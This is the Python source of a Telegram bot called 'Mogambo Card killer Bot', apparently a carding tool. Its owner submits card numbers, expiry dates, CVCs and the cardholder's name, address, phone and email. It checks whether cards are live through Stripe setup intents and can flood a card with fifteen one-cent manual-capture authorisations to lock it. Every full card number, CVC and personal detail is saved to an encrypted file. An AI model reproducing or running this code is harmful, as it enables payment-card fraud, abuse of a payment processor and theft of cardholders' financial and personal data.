# bot.py
import os
import json
import base64
import hashlib
import time
import threading
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import ForceReply
from pyrogram.enums import ParseMode  # ← ADD THIS
import stripe
from cryptography.fernet import Fernet

from config import *

app = Client("mogambo_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
stripe.api_key = STRIPE_KEY
state = {}

# === ENCRYPTION ===
def get_fernet():
    key = hashlib.sha256(ENCRYPTION_KEY.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

def save_data(entry):
    f = get_fernet()
    if os.path.exists('my_personal_card_data.enc'):
        with open('my_personal_card_data.enc', 'rb') as file:
            enc = file.read()
        try:
            dec = f.decrypt(enc)
            lst = json.loads(dec)
        except:
            lst = []
    else:
        lst = []
    lst.append(entry)
    enc_new = f.encrypt(json.dumps(lst).encode())
    with open('my_personal_card_data.enc', 'wb') as file:
        file.write(enc_new)

def load_data():
    if not os.path.exists('my_personal_card_data.enc'):
        return []
    f = get_fernet()
    try:
        with open('my_personal_card_data.enc', 'rb') as file:
            enc = file.read()
        dec = f.decrypt(enc)
        return json.loads(dec)
    except:
        return []

# === CARD PROCESSING ===
def do_auth(message, cmd, info, card, mm, yy, cvc):
    last4 = card[-4:]
    success = False
    result_msg = ""
    try:
        mm = int(mm)
        yy = int(yy)
        if yy < 100:
            yy += 2000

        pm = stripe.PaymentMethod.create(
            type="card",
            card={"number": card, "exp_month": mm, "exp_year": yy, "cvc": cvc},
        )

        if cmd == 'check':
            si = stripe.SetupIntent.create(payment_method=pm.id, confirm=True, usage="off_session")
            if si.status in ['succeeded', 'requires_capture']:
                result_msg = f"Card is valid! (Last 4: {last4})"
                success = True
            else:
                result_msg = "Validation failed."
        elif cmd == 'hold':
            for _ in range(15):
                pi = stripe.PaymentIntent.create(
                    amount=1, currency="usd", payment_method=pm.id, confirm=True, capture_method="manual"
                )
                if pi.status != "requires_capture":
                    raise Exception("Auth failed.")
            result_msg = f"15x $0.01 auth sent. Card (Last 4: {last4}) on hold (1-24 hrs)."
            success = True

    except stripe.error.CardError as e:
        result_msg = f"Card Error: {e.user_message} (Code: {e.code})"
    except stripe.error.StripeError as e:
        result_msg = f"Stripe Error: {e.user_message or str(e)}"
    except Exception as e:
        result_msg = f"Error: {str(e)}"

    message.reply(result_msg)

    entry = {
        'timestamp': datetime.now().isoformat(),
        'command': cmd,
        'name': info.get('name', '') if info else '',
        'zip': info.get('zip', '') if info else '',
        'address': info.get('address', '') if info else '',
        'phone': info.get('phone', '') if info else '',
        'email': info.get('email', '') if info else '',
        'card': card,
        'exp_month': mm,
        'exp_year': yy,
        'cvc': cvc,
        'result': 'success' if success else 'failed'
    }
    save_data(entry)

# === CARD PROCESSING WITH CONFIRM ===
def process_card(message, cmd, info, card, mm, yy, cvc):
    if cmd == 'check':
        do_auth(message, cmd, info, card, mm, yy, cvc)
    elif cmd == 'hold':
        state['pending'] = {'cmd': cmd, 'info': info, 'card': card, 'mm': mm, 'yy': yy, 'cvc': cvc}
        def timeout():
            if 'pending' in state:
                message.reply("Hold cancelled (60s timeout).")
                state.pop('pending', None)
                state.pop('timer', None)
        timer = threading.Timer(60, timeout)
        timer.start()
        state['timer'] = timer
        message.reply("Send **YES** to confirm 15x $0.01 hold.", parse_mode=ParseMode.MARKDOWN, reply_markup=ForceReply())

# === CUSTOM FILTER: Text + Owner + Not Command ===
def is_text_non_command(_, __, m):
    return m.text and m.from_user and m.from_user.id == OWNER_ID and not m.command

text_non_command = filters.create(is_text_non_command)

# === HANDLERS ===
@app.on_message(filters.command("start") & filters.user(OWNER_ID))
def start(client, message):
    message.reply(
        "*Mogambo Card killer Bot*\n\n"
        " MADE BY DARK_SHADOW \n"
        "`/check` → $0.00 validation\n"
        "`/hold` → 15x Speed → Killer\n"
        "`/my_data` → Its only for Owner\n\n"
        "Card daalo!_",
        parse_mode=ParseMode.MARKDOWN
    )

@app.on_message(filters.command(["check", "hold"]) & filters.user(OWNER_ID))
def command_handler(client, message):
    cmd = message.command[0]
    args = message.command[1:]

    if len(args) == 4:
        card, mm, yy, cvc = args
        info = state.pop('info', None) if 'info' in state and state.get('command') == cmd else None
        if 'command' in state: state.pop('command')
        process_card(message, cmd, info, card, mm, yy, cvc)
    elif len(args) == 0:
        if 'step' in state:
            message.reply("Complete current info collection.")
            return
        state['command'] = cmd
        state['step'] = 'name'
        state['info'] = {}
        message.reply("Enter *Full Name*:", parse_mode=ParseMode.MARKDOWN, reply_markup=ForceReply())
    else:
        message.reply(
            f"Invalid format!\n\n"
            f"Direct: `/{cmd} 4242424242424242 12 25 123`\n"
            f"Or: `/{cmd}` → fill info step-by-step",
            parse_mode=ParseMode.MARKDOWN
        )

@app.on_message(filters.command("my_data") & filters.user(OWNER_ID))
def my_data_handler(client, message):
    data = load_data()
    if not data:
        message.reply("No data saved yet.")
        return

    text = "*Saved Card Data*\n\n"
    for i, entry in enumerate(data, 1):
        last4 = entry['card'][-4:] if entry.get('card') else 'N/A'
        text += f"*{i}. {entry['timestamp'][:19].replace('T', ' ')}*\n"
        text += f"Cmd: `{entry['command']}`\n"
        text += f"Name: `{entry.get('name', 'N/A')}`\n"
        text += f"ZIP: `{entry.get('zip', 'N/A')}`\n"
        text += f"Address: `{entry.get('address', 'N/A')}`\n"
        text += f"Phone: `{entry.get('phone', 'N/A')}`\n"
        text += f"Email: `{entry.get('email', 'N/A')}`\n"
        text += f"Card: `****{last4}`\n"
        text += f"Result: `{entry['result']}`\n\n"

    if len(text) > 4000:
        for part in [text[i:i+4000] for i in range(0, len(text), 4000)]:
            message.reply(part, parse_mode=ParseMode.MARKDOWN)
    else:
        message.reply(text, parse_mode=ParseMode.MARKDOWN)

@app.on_message(text_non_command)
def text_handler(client, message):
    if 'pending' in state:
        if message.text.strip().upper() == 'YES':
            if 'timer' in state: state['timer'].cancel()
            pending = state.pop('pending')
            state.pop('timer', None)
            do_auth(message, pending['cmd'], pending['info'], pending['card'],
                    pending['mm'], pending['yy'], pending['cvc'])
        else:
            if 'timer' in state: state['timer'].cancel()
            state.pop('pending', None)
            state.pop('timer', None)
            message.reply("Hold cancelled.")
        return

    if 'step' not in state:
        return

    step = state['step']
    text = message.text.strip()

    if step == 'name':
        state['info']['name'] = text
        state['step'] = 'zip'
        message.reply("Enter *ZIP Code*:", parse_mode=ParseMode.MARKDOWN, reply_markup=ForceReply())
    elif step == 'zip':
        state['info']['zip'] = text
        state['step'] = 'address'
        message.reply("Enter *Address*:", parse_mode=ParseMode.MARKDOWN, reply_markup=ForceReply())
    elif step == 'address':
        state['info']['address'] = text
        state['step'] = 'phone'
        message.reply("Enter *Phone Number*:", parse_mode=ParseMode.MARKDOWN, reply_markup=ForceReply())
    elif step == 'phone':
        state['info']['phone'] = text
        state['step'] = 'email'
        message.reply("Enter *Email*:", parse_mode=ParseMode.MARKDOWN, reply_markup=ForceReply())
    elif step == 'email':
        state['info']['email'] = text
        cmd = state.pop('command')
        state.pop('step')
        message.reply(
            f"Info saved!\n\n"
            f"Send card:\n`/{cmd} <card> <mm> <yy> <cvc>`\n"
            f"Example: `/{cmd} 4242424242424242 12 25 123`",
            parse_mode=ParseMode.MARKDOWN
        )

# === RUN ===
if __name__ == "__main__":
    print("Mogambo Bot Starting...")
    app.run()